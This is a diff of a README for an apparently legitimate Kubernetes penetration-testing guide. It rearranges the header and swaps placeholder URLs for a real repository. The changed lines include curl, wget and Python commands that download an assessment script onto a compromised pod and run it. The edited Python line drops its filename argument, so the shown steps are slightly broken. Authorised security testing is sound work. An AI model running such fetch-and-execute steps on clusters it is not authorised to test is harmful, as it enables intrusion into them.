@@ -1,17 +1,5 @@
 <div align="center">
 
-# ☸ Kubernetes Security Assessment
-### EKS & GKE — Comprehensive Penetration Testing Guide
-
-[![Assessment Type](https://img.shields.io/badge/Type-Penetration%20Testing-red?style=for-the-badge&logo=kubernetes)](.)
-[![Platforms](https://img.shields.io/badge/Platforms-EKS%20%7C%20GKE-blue?style=for-the-badge&logo=amazonaws)](.)
-[![Starting Point](https://img.shields.io/badge/Entry%20Point-Compromised%20Pod-orange?style=for-the-badge)](.)
-[![Philosophy](https://img.shields.io/badge/Philosophy-Prove%20%26%20Document-green?style=for-the-badge)](.)
-
-</div>
-
----
-
 ## 🛠️ KubeXHunt — Automated Assessment Tool
 
 > **Drop this tool onto any compromised pod and run a full automated assessment of the entire cluster.**
@@ -30,13 +18,13 @@
 
 ```bash
 # Download on the compromised pod
-curl -sLO https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py
+curl -sLO https://raw.githubusercontent.com/mr-xhunt/Kubernetest-Assessment/refs/heads/main/kubexhunt.py
 
 # OR using wget
-wget -q https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py
+wget -q https://raw.githubusercontent.com/mr-xhunt/Kubernetest-Assessment/refs/heads/main/kubexhunt.py
 
 # OR using Python itself (if curl/wget unavailable)
-python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py', 'kubexhunt.py')"
+python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/mr-xhunt/Kubernetest-Assessment/refs/heads/main/kubexhunt.py')"
 
 # Run full assessment
 python3 kubexhunt.py
@@ -161,6 +149,20 @@ curl -s https://raw.githubusercontent.com/your-repo/kubexhunt/main/kubexhunt.py 
 > **Starting Point:** You have Remote Code Execution (RCE) inside a compromised pod.
 > All commands are executed **from inside that pod** unless stated otherwise.
 > **Philosophy:** Demonstrate impact without destroying — read, enumerate, prove, document.
+
+---
+
+<div align="center">
+
+# ☸ Kubernetes Security Assessment
+### EKS & GKE — Comprehensive Penetration Testing Guide
+
+[![Assessment Type](https://img.shields.io/badge/Type-Penetration%20Testing-red?style=for-the-badge&logo=kubernetes)](.)
+[![Platforms](https://img.shields.io/badge/Platforms-EKS%20%7C%20GKE-blue?style=for-the-badge&logo=amazonaws)](.)
+[![Starting Point](https://img.shields.io/badge/Entry%20Point-Compromised%20Pod-orange?style=for-the-badge)](.)
+[![Philosophy](https://img.shields.io/badge/Philosophy-Prove%20%26%20Document-green?style=for-the-badge)](.)
+
+</div>
 
 ---
 
